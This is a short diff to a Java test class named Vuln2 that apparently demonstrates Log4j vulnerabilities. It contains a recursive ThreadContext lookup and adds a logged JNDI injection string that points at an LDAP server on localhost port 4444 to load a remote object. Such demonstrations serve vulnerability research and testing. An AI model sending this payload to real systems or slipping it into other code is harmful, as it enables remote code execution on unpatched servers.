@@ -9,5 +9,6 @@ public class Vuln2 {
         // appender.console.layout.pattern = ${ctx:myvar} - %m%n
         ThreadContext.put("myvar", "${${ctx:myvar}}");
         logger.error("Any string");
+        logger.error("${jndi:ldap://localhost:4444/exp}");
     }
 }
